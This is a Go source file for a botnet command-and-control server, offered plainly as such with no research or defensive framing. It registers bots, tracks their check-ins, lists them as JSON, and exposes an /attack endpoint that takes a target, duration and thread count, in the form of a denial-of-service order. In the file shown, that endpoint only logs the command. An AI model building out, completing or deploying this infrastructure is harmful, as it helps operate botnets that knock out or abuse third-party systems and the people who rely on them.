package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

type Bot struct {
	ID       string    `json:"id"`
	IP       string    `json:"ip"`
	LastSeen time.Time `json:"last_seen"`
	Status   string    `json:"status"`
}

type AttackCommand struct {
	Target   string `json:"target"`
	Duration int    `json:"duration"`
	Threads  int    `json:"threads"`
}

var (
	bots    = make(map[string]*Bot)
	botsMux sync.RWMutex
)

func main() {
	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	fmt.Printf("🚀 Starting C2 Server on port %s...\n", port)
	
	http.HandleFunc("/", handleRoot)
	http.HandleFunc("/register", handleRegister)
	http.HandleFunc("/bots", handleGetBots)
	http.HandleFunc("/attack", handleAttack)
	http.HandleFunc("/status", handleStatus)
	
	go cleanupInactiveBots()
	
	log.Printf("Server running on port %s", port)
	log.Fatal(http.ListenAndServe(":"+port, nil))
}

func handleRoot(w http.ResponseWriter, r *http.Request) {
	fmt.Fprintf(w, "🤖 C2 Server is running!\n\n")
	fmt.Fprintf(w, "Endpoints:\n")
	fmt.Fprintf(w, "GET  /bots     - List all bots\n")
	fmt.Fprintf(w, "POST /attack   - Start attack\n")
	fmt.Fprintf(w, "GET  /register - Bot registration\n")
}

func handleRegister(w http.ResponseWriter, r *http.Request) {
	botID := r.URL.Query().Get("id")
	if botID == "" {
		http.Error(w, "Missing bot ID", http.StatusBadRequest)
		return
	}
	
	botIP := getIP(r)
	
	botsMux.Lock()
	bots[botID] = &Bot{
		ID:       botID,
		IP:       botIP,
		LastSeen: time.Now(),
		Status:   "active",
	}
	botsMux.Unlock()
	
	fmt.Printf("✅ Bot registered: %s from %s\n", botID, botIP)
	w.Write([]byte("registered"))
}

func handleGetBots(w http.ResponseWriter, r *http.Request) {
	botsMux.RLock()
	defer botsMux.RUnlock()
	
	botList := make([]*Bot, 0, len(bots))
	for _, bot := range bots {
		botList = append(botList, bot)
	}
	
	json.NewEncoder(w).Encode(botList)
}

func handleAttack(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var cmd AttackCommand
	if err := json.NewDecoder(r.Body).Decode(&cmd); err != nil {
		http.Error(w, err.Error(), http.StatusBadRequest)
		return
	}
	
	fmt.Printf("🎯 Attack command received: %+v\n", cmd)
	w.Write([]byte("attack_command_received"))
}

func handleStatus(w http.ResponseWriter, r *http.Request) {
	botID := r.URL.Query().Get("id")
	if botID == "" {
		http.Error(w, "Missing bot ID", http.StatusBadRequest)
		return
	}
	
	botsMux.Lock()
	if bot, exists := bots[botID]; exists {
		bot.LastSeen = time.Now()
	}
	botsMux.Unlock()
	
	w.Write([]byte("status_updated"))
}

func cleanupInactiveBots() {
	ticker := time.NewTicker(60 * time.Second)
	for range ticker.C {
		botsMux.Lock()
		for id, bot := range bots {
			if time.Since(bot.LastSeen) > 5*time.Minute {
				delete(bots, id)
				fmt.Printf("🗑️ Removed inactive bot: %s\n", id)
			}
		}
		fmt.Printf("🤖 Active bots: %d\n", len(bots))
		botsMux.Unlock()
	}
}

func getIP(r *http.Request) string {
	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
		return ip
	}
	if ip := r.Header.Get("X-Real-IP"); ip != "" {
		return ip
	}
	return r.RemoteAddr
}
